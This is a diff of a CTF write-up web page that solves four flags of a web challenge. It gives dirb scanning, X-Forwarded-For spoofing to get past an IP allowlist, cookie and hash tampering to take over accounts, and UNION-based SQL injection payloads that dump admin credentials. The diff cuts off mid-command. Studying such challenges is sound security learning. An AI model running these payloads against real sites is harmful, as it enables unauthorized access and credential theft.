@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -25,106 +96,105 @@
 </header>
 <h2 id="flag-1">Flag 1</h2>
 <p>Try to guess the path, in <code>robots.txt</code></p>
-<pre><code>User-agent: *
-Disallow: s3cr3t-4dm1n/</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1"></a>User-agent: *</span>
+<span id="cb1-2"><a href="#cb1-2"></a>Disallow: s3cr3t-4dm1n/</span></code></pre></div>
 <p>But it gives a <code>403</code> response while accessing <code>s3cr3t-4dm1n</code>. Try to scan any subpath in <code>s3cr3t-4dm1n/</code> with <code>dirb</code>.</p>
-<pre><code>dirb http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n ../dirb222/wordlists/common.txt</code></pre>
-<pre><code>---- Scanning URL: http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ ----                                                                                       
-+ http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess (CODE:200|SIZE:69)
-...</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a><span class="ex">dirb</span> http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n ../dirb222/wordlists/common.txt</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1"></a><span class="ex">----</span> Scanning URL: http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ ----                                                                                       </span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="ex">+</span> http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess (CODE:200<span class="kw">|</span><span class="ex">SIZE</span>:69)</span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="ex">...</span></span></code></pre></div>
 <p>Now we have an accessible path <code>.htaccess</code>. Request the file it with <code>httpie</code>.</p>
-<pre><code>http -v http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess
-
-GET /c9c213fc7b/s3cr3t-4dm1n/.htaccess HTTP/1.1
-User-Agent: HTTPie/1.0.3
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Host: 35.227.24.107
-
-
-
-HTTP/1.1 200 OK
-Server: nginx/1.14.0 (Ubuntu)
-Date: Mon, 29 Mar 2021 06:16:00 GMT
-Content-Type: plain/text
-Transfer-Encoding: chunked
-Connection: keep-alive
-Content-disposition: attachment; filename=.htaccess
-
-Order Deny,Allow
-Deny from all
-Allow from 8.8.8.8
-Allow from 8.8.4.4</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1"></a>http -v http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess</span>
+<span id="cb4-2"><a href="#cb4-2"></a></span>
+<span id="cb4-3"><a href="#cb4-3"></a>GET /c9c213fc7b/s3cr3t-4dm1n/.htaccess HTTP/1.1</span>
+<span id="cb4-4"><a href="#cb4-4"></a>User-Agent: HTTPie/1.0.3</span>
+<span id="cb4-5"><a href="#cb4-5"></a>Accept-Encoding: gzip, deflate</span>
+<span id="cb4-6"><a href="#cb4-6"></a>Accept: */*</span>
+<span id="cb4-7"><a href="#cb4-7"></a>Connection: keep-alive</span>
+<span id="cb4-8"><a href="#cb4-8"></a>Host: 35.227.24.107</span>
+<span id="cb4-9"><a href="#cb4-9"></a></span>
+<span id="cb4-10"><a href="#cb4-10"></a></span>
+<span id="cb4-11"><a href="#cb4-11"></a></span>
+<span id="cb4-12"><a href="#cb4-12"></a>HTTP/1.1 200 OK</span>
+<span id="cb4-13"><a href="#cb4-13"></a>Server: nginx/1.14.0 (Ubuntu)</span>
+<span id="cb4-14"><a href="#cb4-14"></a>Date: Mon, 29 Mar 2021 06:16:00 GMT</span>
+<span id="cb4-15"><a href="#cb4-15"></a>Content-Type: plain/text</span>
+<span id="cb4-16"><a href="#cb4-16"></a>Transfer-Encoding: chunked</span>
+<span id="cb4-17"><a href="#cb4-17"></a>Connection: keep-alive</span>
+<span id="cb4-18"><a href="#cb4-18"></a>Content-disposition: attachment; filename=.htaccess</span>
+<span id="cb4-19"><a href="#cb4-19"></a></span>
+<span id="cb4-20"><a href="#cb4-20"></a>Order Deny,Allow</span>
+<span id="cb4-21"><a href="#cb4-21"></a>Deny from all</span>
+<span id="cb4-22"><a href="#cb4-22"></a>Allow from 8.8.8.8</span>
+<span id="cb4-23"><a href="#cb4-23"></a>Allow from 8.8.4.4</span></code></pre></div>
 <p>Allowed IPs are <code>8.8.8.8</code> and <code>8.8.4.4</code>. Now try to request <code>s3cr3t-4dmin</code> again with one of these IPs.</p>
 <pre><code>http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ X-Forwarded-For:8.8.8.8</code></pre>
 <p>In response there is one flag and admin login form.</p>
 <h2 id="flag-2">Flag 2</h2>
 <p>Register a user account and login with it, there are four options in dashboard. Switch to subusers, it allows us to register subuser under current user account. The request needs three parameters, <code>owner_hash</code>, <code>new_username</code> and <code>new_password</code>. It’s slightly different from register form at home page, try to request a new account with <code>owner_hash</code> parameter and the value is account hash of user <code>hunter2</code>. Account hash of user <code>hunter2</code> is located in a hidden field in password reset page.</p>
-<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/register owner_hash=cf505baebbaf25a0a4c63eb93331eb36 new_username=888 new_password=onetwo</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1"></a><span class="ex">http</span> -v --form POST http://35.227.24.107/c9c213fc7b/register owner_hash=cf505baebbaf25a0a4c63eb93331eb36 new_username=888 new_password=onetwo</span></code></pre></div>
 <p>Now the new user <code>888</code> has been created, login with it, the account is still awaiting activation, but we get the second flag.</p>
 <h2 id="flag-3">Flag 3</h2>
 <p>To activate user <code>888</code>, we need to login as another user <code>one</code> to use the subuser enable function, but change the subuser hash to <code>888</code>’s account hash and <code>userhash</code> in cookie to <code>hunter2</code>’s account hash.</p>
-<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/dashboard/subusers \
-  &quot;Cookie:token=MzY4MGM4Nzg5YTQzMTEwYzc4MmZjZmNjZTg5ODJhYTc5NWUyZDU4OWZlZTNkMmFlZjliZDBlNjgwNjQ1ZGQzMDQ2YWYyZTAzYmU1Mzk3MzEzMjA1YTQxYzdkNDYwYWI3OTRjZGI4Y2UzODBmOTdmZWQ3MmExZjgyYWQwZGU2YjM%3D;userhash=cf505baebbaf25a0a4c63eb93331eb36&quot;\
-  hash=1997b46b3fea065fa085562a6a6dcc09\
-  enable_toggle=enable
-</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a><span class="ex">http</span> -v --form POST http://35.227.24.107/c9c213fc7b/dashboard/subusers \</span>
+<span id="cb7-2"><a href="#cb7-2"></a>  <span class="st">&quot;Cookie:token=MzY4MGM4Nzg5YTQzMTEwYzc4MmZjZmNjZTg5ODJhYTc5NWUyZDU4OWZlZTNkMmFlZjliZDBlNjgwNjQ1ZGQzMDQ2YWYyZTAzYmU1Mzk3MzEzMjA1YTQxYzdkNDYwYWI3OTRjZGI4Y2UzODBmOTdmZWQ3MmExZjgyYWQwZGU2YjM%3D;userhash=cf505baebbaf25a0a4c63eb93331eb36&quot;</span>\</span>
+<span id="cb7-3"><a href="#cb7-3"></a>  hash=1997b46b3fea065fa085562a6a6dcc09\</span>
+<span id="cb7-4"><a href="#cb7-4"></a>  enable_toggle=enable</span></code></pre></div>
 <p>After the previous step, logout user <code>one</code> and login as user <code>888</code>, the third flag is right under user details.</p>
 <h2 id="flag-4">Flag 4</h2>
 <p>In source code of <code>Your Auctions</code> section exists a subpath<code>auctions/questions</code>, it takes one parameter <code>id</code>, which is auction type id from <code>1</code> to <code>5</code>.</p>
-<pre><code>{&quot;name&quot;:&quot;Desktops&quot;,&quot;questions&quot;:[{&quot;question&quot;:&quot;Make&quot;,&quot;field_name&quot;:&quot;field_4728_186574&quot;},{&quot;question&quot;:&quot;Model&quot;,&quot;field_name&quot;:&quot;field_5738_281961&quot;},{&quot;question&quot;:&quot;RAM&quot;,&quot;field_name&quot;:&quot;field_5051_369408&quot;},{&quot;question&quot;:&quot;Processors&quot;,&quot;field_name&quot;:&quot;field_4032_347621&quot;}],&quot;auctions&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;Ultra Desktop&quot;},{&quot;id&quot;:&quot;9&quot;,&quot;title&quot;:&quot;Premium Desktop&quot;},{&quot;id&quot;:&quot;10&quot;,&quot;title&quot;:&quot;Work Station&quot;}]}</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;Desktops&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;question&quot;</span><span class="op">:</span><span class="st">&quot;Make&quot;</span><span class="op">,</span><span class="st">&quot;field_name&quot;</span><span class="op">:</span><span class="st">&quot;field_4728_186574&quot;</span><span class="op">},{</span><span class="st">&quot;question&quot;</span><span class="op">:</span><span class="st">&quot;Model&quot;</span><span class="op">,</span><span class="st">&quot;field_name&quot;</span><span class="op">:</span><span class="st">&quot;field_5738_281961&quot;</span><span class="op">},{</span><span class="st">&quot;question&quot;</span><span class="op">:</span><span class="st">&quot;RAM&quot;</span><span class="op">,</span><span class="st">&quot;field_name&quot;</span><span class="op">:</span><span class="st">&quot;field_5051_369408&quot;</span><span class="op">},{</span><span class="st">&quot;question&quot;</span><span class="op">:</span><span class="st">&quot;Processors&quot;</span><span class="op">,</span><span class="st">&quot;field_name&quot;</span><span class="op">:</span><span class="st">&quot;field_4032_347621&quot;</span><span class="op">}</span>]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;1&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;Ultra Desktop&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;9&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;Premium Desktop&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;10&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;Work Station&quot;</span><span class="op">}</span>]<span class="op">}</span></span></code></pre></div>
 <p>If we give it <code>id=0</code>, error message returns.</p>
-<pre><code>{&quot;error&quot;:&quot;Invalid auction type ID entered&quot;}</code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1"></a><span class="op">{</span><span class="st">&quot;error&quot;</span><span class="op">:</span><span class="st">&quot;Invalid auction type ID entered&quot;</span><span class="op">}</span></span></code></pre></div>
 <p>A normal response contains three fields, <code>name</code>, <code>questions</code> and <code>auctions</code>. Try to use <code>union</code> to guess some information out of it.</p>
-<pre><code>0 union select &#39;0 union select 1&#39;,2,&#39;[]&#39; --</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb10-1"><a href="#cb10-1"></a><span class="dv">0</span> <span class="kw">union</span> <span class="kw">select</span> <span class="st">&#39;0 union select 1&#39;</span>,<span class="dv">2</span>,<span class="st">&#39;[]&#39;</span> <span class="co">--</span></span></code></pre></div>
 <p>Payload above give us the following response.</p>
-<pre><code>{&quot;name&quot;:&quot;[]&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[]}</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;[]&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[]<span class="op">}</span></span></code></pre></div>
 <p>Keep adding column numbers until something different shown.</p>
-<pre><code>0 union select &#39;0 union select 1,2,3,4,5,6,7,8,9&#39;,10,&#39;[]&#39; --</code></pre>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1"></a><span class="dv">0</span> <span class="kw">union</span> <span class="kw">select</span> <span class="st">&#39;0 union select 1,2,3,4,5,6,7,8,9&#39;</span>,<span class="dv">10</span>,<span class="st">&#39;[]&#39;</span> <span class="co">--</span></span></code></pre></div>
 <p>In response column <code>1</code> was taken as auction id, column <code>6</code> was taken as title and name was replaced by <code>10</code>.</p>
-<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;6&quot;}]}</code></pre>
+<div class="sourceCode" id="cb13"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;10&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;1&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">}</span>]<span class="op">}</span></span></code></pre></div>
 <p>Now chage <code>1</code> to <code>table_name</code> to get table names from <code>information_schema</code>.</p>
-<pre><code>0 union select &#39;0 union select table_name,2,3,4,5,6,7,8,9 from information_schema.tables&#39;,10,&#39;[]&#39; --</code></pre>
+<div class="sourceCode" id="cb14"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb14-1"><a href="#cb14-1"></a><span class="dv">0</span> <span class="kw">union</span> <span class="kw">select</span> <span class="st">&#39;0 union select table_name,2,3,4,5,6,7,8,9 from information_schema.tables&#39;</span>,<span class="dv">10</span>,<span class="st">&#39;[]&#39;</span> <span class="co">--</span></span></code></pre></div>
 <p>In output, table <code>admin</code> and <code>auction</code> are interesting.</p>
-<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;admin&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;auction&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;ALL_PLUGINS&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;APPLICABLE_ROLES&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;CHARACTER_SETS&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;COLLATIONS&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;COLLATION_CHARACTER_SET_APPLICABILITY&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;COLUMNS&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;COLUMN_PRIVILEGES&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;ENABLED_ROLES&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;ENGINES&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;EVENTS&quot;,&quot;title&quot;:&quot;6&quot;},
-{&quot;id&quot;:&quot;FILES&quot;,&quot;title&quot;:&quot;6&quot;},
-...</code></pre>
+<div class="sourceCode" id="cb15"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;10&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;admin&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;auction&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-2"><a href="#cb15-2"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;ALL_PLUGINS&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;APPLICABLE_ROLES&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-3"><a href="#cb15-3"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;CHARACTER_SETS&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;COLLATIONS&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-4"><a href="#cb15-4"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;COLLATION_CHARACTER_SET_APPLICABILITY&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-5"><a href="#cb15-5"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;COLUMNS&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-6"><a href="#cb15-6"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;COLUMN_PRIVILEGES&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-7"><a href="#cb15-7"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;ENABLED_ROLES&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-8"><a href="#cb15-8"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;ENGINES&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-9"><a href="#cb15-9"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;EVENTS&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-10"><a href="#cb15-10"></a><span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;FILES&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},</span></span>
+<span id="cb15-11"><a href="#cb15-11"></a>...</span></code></pre></div>
 <p>Try to list columns in table <code>admin</code>.</p>
-<pre><code>0 union select &#39;0 union select COLUMN_NAME,2,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name=&quot;admin&quot;&#39;,10,&#39;[]&#39; --</code></pre>
-<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;id&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;username&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;password&quot;,&quot;title&quot;:&quot;6&quot;}]}</code></pre>
+<div class="sourceCode" id="cb16"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb16-1"><a href="#cb16-1"></a><span class="dv">0</span> <span class="kw">union</span> <span class="kw">select</span> <span class="st">&#39;0 union select COLUMN_NAME,2,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name=&quot;admin&quot;&#39;</span>,<span class="dv">10</span>,<span class="st">&#39;[]&#39;</span> <span class="co">--</span></span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;10&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;id&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;username&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">},{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;password&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;6&quot;</span><span class="op">}</span>]<span class="op">}</span></span></code></pre></div>
 <p>Now we know there are three columns in the table, try to fetch <code>username</code> and <code>password</code> from it, replace column <code>1</code> with <code>username</code> and column <code>6</code> with <code>password</code>.</p>
-<pre><code>0 union select &#39;0 union select username,2,3,4,5,password,7,8,9 from admin&#39;,10,&#39;[]&#39; --</code></pre>
-<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;h4ckerbayadmin&quot;,&quot;title&quot;:&quot;auction$rFun!&quot;}]}</code></pre>
+<div class="sourceCode" id="cb18"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb18-1"><a href="#cb18-1"></a><span class="dv">0</span> <span class="kw">union</span> <span class="kw">select</span> <span class="st">&#39;0 union select username,2,3,4,5,password,7,8,9 from admin&#39;</span>,<span class="dv">10</span>,<span class="st">&#39;[]&#39;</span> <span class="co">--</span></span></code></pre></div>
+<div class="sourceCode" id="cb19"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1"></a><span class="op">{</span><span class="st">&quot;name&quot;</span><span class="op">:</span><span class="st">&quot;10&quot;</span><span class="op">,</span><span class="st">&quot;questions&quot;</span><span class="op">:</span>[]<span class="op">,</span><span class="st">&quot;auctions&quot;</span><span class="op">:</span>[<span class="op">{</span><span class="st">&quot;id&quot;</span><span class="op">:</span><span class="st">&quot;h4ckerbayadmin&quot;</span><span class="op">,</span><span class="st">&quot;title&quot;</span><span class="op">:</span><span class="st">&quot;auction$rFun!&quot;</span><span class="op">}</span>]<span class="op">}</span></span></code></pre></div>
 <p>So the username is <code>h4ckerbayadmin</code> and password is <code>auction$rFun!</code>.</p>
 <p>Remember the admin login page we get before? Now login with correct credential.</p>
-<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
-  X-Forwarded-For:8.8.8.8 \
-  username=h4ckerbayadmin \
-  password=&quot;auction\$rFun!&quot; </code></pre>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1"></a><span class="ex">http</span> -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \</span>
+<span id="cb20-2"><a href="#cb20-2"></a>  X-Forwarded-For:8.8.8.8 \</span>
+<span id="cb20-3"><a href="#cb20-3"></a>  username=h4ckerbayadmin \</span>
+<span id="cb20-4"><a href="#cb20-4"></a>  password=<span class="st">&quot;auction</span><span class="dt">\$</span><span class="st">rFun!&quot;</span> </span></code></pre></div>
 <p>Access admin page with received token.</p>
-<pre><code>http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
-  X-Forwarded-For:8.8.8.8 \
-  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7</code></pre>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1"></a><span class="ex">http</span> -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\</span>
+<span id="cb21-2"><a href="#cb21-2"></a>  X-Forwarded-For:8.8.8.8 \</span>
+<span id="cb21-3"><a href="#cb21-3"></a>  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7</span></code></pre></div>
 <p>Input the auction hash shown in <code>dashboard/auctions</code> page while login as <code>888</code>.</p>
-<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
-  X-Forwarded-For:8.8.8.8 \
-  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
-  auction_hash=8ylbbgs2</code></pre>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1"></a><span class="ex">http</span> -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\</span>
+<span id="cb22-2"><a href="#cb22-2"></a>  X-Forwarded-For:8.8.8.8 \</span>
+<span id="cb22-3"><a href="#cb22-3"></a>  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \</span>
